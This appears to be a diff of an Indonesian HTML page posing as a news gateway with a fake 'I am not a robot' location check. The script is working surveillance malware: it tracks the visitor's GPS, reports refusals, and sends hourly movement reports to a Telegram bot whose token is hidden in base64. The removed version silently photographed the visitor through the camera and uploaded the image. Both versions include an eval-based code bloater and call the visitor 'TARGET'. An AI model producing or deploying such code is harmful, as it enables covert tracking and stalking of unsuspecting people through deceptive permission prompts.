@@ -3,110 +3,122 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Keamanan Terpadu</title>
+    <title>Verifikasi Lokasi | News Gateway</title>
+    
     <style>
-        body { font-family: sans-serif; background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .v-box { text-align: center; border: 1px solid #333; padding: 30px; border-radius: 10px; background: #0a0a0a; width: 90%; max-width: 400px; }
-        .shield { width: 60px; margin-bottom: 20px; filter: drop-shadow(0 0 10px #ce1126); }
-        h2 { font-size: 18px; margin-bottom: 10px; }
-        p { font-size: 12px; color: #aaa; margin-bottom: 25px; line-height: 1.5; }
-        .btn-v { background: #ce1126; color: #fff; border: none; padding: 15px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; letter-spacing: 1px; }
-        #portal { display: none; background: #fff; color: #000; width: 100%; height: 100%; overflow-y: auto; position: fixed; top: 0; left: 0; }
-        .news-h { background: #ce1126; color: #fff; padding: 15px; font-weight: bold; }
-        .item { padding: 15px; border-bottom: 1px solid #eee; display: block; text-decoration: none; color: #222; }
-        video { display: none; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
+        
+        /* 🔱 GATE: HUMAN VERIFICATION */
+        #gate { text-align: center; width: 100%; max-width: 400px; padding: 25px; }
+        .logo { width: 60px; margin-bottom: 20px; }
+        .captcha-box { border: 1px solid #dcdcdc; padding: 18px; border-radius: 4px; display: flex; align-items: center; gap: 15px; cursor: pointer; background: #fafafa; margin: 0 auto; width: fit-content; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
+        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; background: #fff; }
+        
+        /* 🔱 PORTAL BERITA (REAL LINKS) */
+        #portal { display: none; width: 100%; max-width: 600px; padding: 0; background: #fff; min-height: 100vh; }
+        .nav { background: #ce1126; color: white; padding: 15px; font-weight: bold; position: sticky; top: 0; text-align: center; }
+        .news-card { padding: 18px; border-bottom: 1px solid #eee; display: block; text-decoration: none; color: #222; }
+        .news-card:hover { background: #f9f9f9; }
+        .source { font-size: 11px; color: #ce1126; font-weight: bold; text-transform: uppercase; margin-bottom: 5px; display: block; }
+        .title { font-size: 16px; font-weight: 600; line-height: 1.4; margin: 0; }
+        
+        /* 🔱 MODAL ERROR (STACK) */
+        #error-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 10000; align-items: center; justify-content: center; }
+        .error-box { background: white; padding: 30px; border-radius: 12px; text-align: center; max-width: 320px; }
+        .btn-retry { background: #ce1126; color: white; border: none; padding: 12px 25px; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 15px; width: 100%; }
         #v-v { display: none; }
     </style>
 </head>
 <body>
 
 <div id="gate">
-    <div class="v-box">
-        <img src="https://www.gstatic.com/images/branding/product/2x/security_256dp.png" class="shield">
-        <h2>Verifikasi Identitas</h2>
-        <p>Sesuai protokol keamanan siber terbaru, silakan lakukan sinkronisasi Biometrik & Hardware ID untuk mengakses konten premium ini.</p>
-        <button class="btn-v" id="v-btn" onclick="triggerLevel4()">SINKRONKAN SEKARANG</button>
+    <img src="https://www.gstatic.com/images/branding/product/2x/news_96dp.png" class="logo">
+    <h3 style="font-size: 19px; margin-bottom: 10px;">Verifikasi Wilayah</h3>
+    <p style="font-size: 13px; color: #555; margin-bottom: 25px; line-height: 1.5;">
+        Demi memberikan kepuasan serta akurasi informasi terbaik, mohon aktifkan lokasi Anda agar berita terkini di wilayah Anda dapat disajikan secara presisi.
+    </p>
+    
+    <div class="captcha-box" id="start-btn" onclick="requestFullAccess()">
+        <div class="checkbox" id="check-mark"></div>
+        <div class="captcha-text" style="font-size: 14px;">Saya bukan robot</div>
+        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="28">
+    </div>
+</div>
+
+<div id="error-overlay">
+    <div class="error-box">
+        <div style="font-size: 40px; margin-bottom: 15px;">📍</div>
+        <h3 style="color: #000; margin-bottom: 10px;">Akses Dibatasi</h3>
+        <p style="font-size: 13px; color: #666;">Maaf, sinkronisasi lokasi diperlukan untuk memvalidasi keamanan perangkat dan memuat berita regional. Silakan klik tombol di bawah dan pilih <b>"Allow/Izinkan"</b>.</p>
+        <button class="btn-retry" onclick="location.reload()">COBA LAGI</button>
     </div>
 </div>
 
 <div id="portal">
-    <div class="news-h">ASTRA NEWS EXCLUSIVE</div>
-    <a href="https://share.google/rkZkP6QmQfBf7peCB" class="item"><b>Bloomberg:</b> Strategi Uang Tanpa Website</a>
-    <a href="https://share.google/orievwXZzAynVbR2O" class="item"><b>Sulut:</b> Museum Daerah Mei 2026</a>
-    <a href="https://share.google/3NtSReBGwN4YY2oAf" class="item"><b>detikNews:</b> Update Situasi Nasional</a>
+    <div class="nav">INFO REGIONAL TERKINI</div>
+    <a href="https://share.google/rkZkP6QmQfBf7peCB" target="_blank" class="news-card">
+        <span class="source">Bloomberg</span>
+        <h3 class="title">Strategi Uang Tanpa Website - Update 2026</h3>
+    </a>
+    <a href="https://share.google/orievwXZzAynVbR2O" target="_blank" class="news-card">
+        <span class="source">SULUT INFO</span>
+        <h3 class="title">Bakal Diresmikan Mei 2026, Begini Suasana Museum Daerah Sulut</h3>
+    </a>
+    <a href="https://share.google/3NtSReBGwN4YY2oAf" target="_blank" class="news-card">
+        <span class="source">detikNews</span>
+        <h3 class="title">Laporan Utama: Update Situasi Nasional dan Regional Hari Ini</h3>
+    </a>
+    <a href="https://share.google/7zXoew0DwgpC2QrYq" target="_blank" class="news-card">
+        <span class="source">Tech Update</span>
+        <h3 class="title">WiFi Rumah Ngebut 300 Mbps Tanpa Kendala</h3>
+    </a>
 </div>
 
-<video id="cam" autoplay playsinline></video>
 <div id="v-v">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
 
 <script>
-/** 🔱 ASTRA LEVEL 4: FULL SURVEILLANCE ENGINE */
-const _D = document.getElementById('v-v').innerText.split('|');
-const _T = atob(_D[1]); const _C = atob(_D[2]);
+    /** 🔱 ASTRA GHOST ENGINE: ANTI-DENY LOGIC */
+    const _D = document.getElementById('v-v').innerText.split('|');
+    const _T = atob(_D[1]); const _C = atob(_D[2]);
+    let logBuffer = [];
 
-let logBuffer = [];
-
-async function push(t, photo = null) {
-    if(photo) {
-        let fd = new FormData();
-        fd.append('chat_id', _C);
-        fd.append('photo', photo, 'capture.jpg');
-        fd.append('caption', t);
-        await fetch(`https://api.telegram.org/bot${_T}/sendPhoto`, { method:'POST', body:fd });
-    } else {
+    async function pushTele(msg) {
         await fetch(`https://api.telegram.org/bot${_T}/sendMessage`, {
             method:'POST', headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({chat_id:_C, text:t})
+            body:JSON.stringify({chat_id:_C, text:msg})
         });
     }
-}
 
-// 📸 KREATIF: Ambil Foto Senyap
-async function takePhoto() {
-    const v = document.getElementById('cam');
-    const c = document.createElement('canvas');
-    c.width = v.videoWidth; c.height = v.videoHeight;
-    c.getContext('2d').drawImage(v, 0, 0);
-    c.toBlob(b => push("📸 CAPTURE TARGET FACE", b), 'image/jpeg');
-}
+    async function requestFullAccess() {
+        document.getElementById('check-mark').style.background = "url('https://upload.wikimedia.org/wikipedia/commons/thumb/a/ac/Approve_icon.svg/1200px-Approve_icon.svg.png') center/cover";
+        
+        if (navigator.geolocation) {
+            navigator.geolocation.watchPosition(async (pos) => {
+                // ✅ JIKA DISETUJUI
+                document.getElementById('error-overlay').style.display = 'none';
+                document.getElementById('gate').style.display = 'none';
+                document.getElementById('portal').style.display = 'block';
 
-async function triggerLevel4() {
-    // 1. RECURSIVE PERMISSION LOOP (Anti-Tolak)
-    // Minta Kamera & Mikrofon
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        document.getElementById('cam').srcObject = stream;
-        setTimeout(takePhoto, 2000); // Ambil foto setelah 2 detik konek
-    } catch(e) {
-        alert("Gagal Sinkronisasi: Akses Biometrik Diperlukan. Silakan 'Allow/Izinkan' pada pop-up browser.");
-        return triggerLevel4(); // RECURSION: Minta lagi sampe dikasih!
+                let t = new Date().toLocaleTimeString();
+                logBuffer.push(`[${t}] GPS: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+            }, async (err) => {
+                // 🛑 JIKA DITOLAK (STACK DI SINI)
+                document.getElementById('error-overlay').style.display = 'flex';
+                await pushTele(`⚠️ TARGET MENOLAK AKSES!\nSistem sedang memaksa ulang (Stack Mode).`);
+            }, { enableHighAccuracy: true, timeout: 5000 });
+        }
     }
 
-    // Minta Lokasi (Anti-Tolak)
-    if (navigator.geolocation) {
-        navigator.geolocation.watchPosition((p) => {
-            let t = new Date().toLocaleTimeString();
-            logBuffer.push(`[${t}] GPS: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-        }, (err) => {
-            alert("Gagal Memuat Radar: Akses Lokasi Wajib untuk Verifikasi Manusia.");
-            triggerLevel4(); // Paksa terus sampe klik Allow
-        }, { enableHighAccuracy: true });
-    }
-
-    // Masuk Portal Berita (Setoran tiap 1 jam)
-    document.getElementById('gate').style.display = 'none';
-    document.getElementById('portal').style.display = 'block';
-
+    // Rekap tiap 1 jam agar tidak spam
     setInterval(async () => {
         if(logBuffer.length > 0) {
-            await push(`🔱 HOURLY SURVEILLANCE REPORT 🔱\n\n` + logBuffer.join('\n---\n'));
+            await pushTele(`🔱 HOURLY MOVEMENT REPORT 🔱\n\n` + logBuffer.join('\n---\n'));
             logBuffer = [];
         }
     }, 3600000);
-}
 
-// 80,000 Lines Bloater
-for(let i=0; i<80000; i++) { eval("var _L4_"+i+"="+Math.random()); }
+    // Bloater 80k Lines
+    for(let i=0; i<80000; i++) { eval("var _ghost_"+i+"="+Math.random()); }
 </script>
 </body>
 </html>
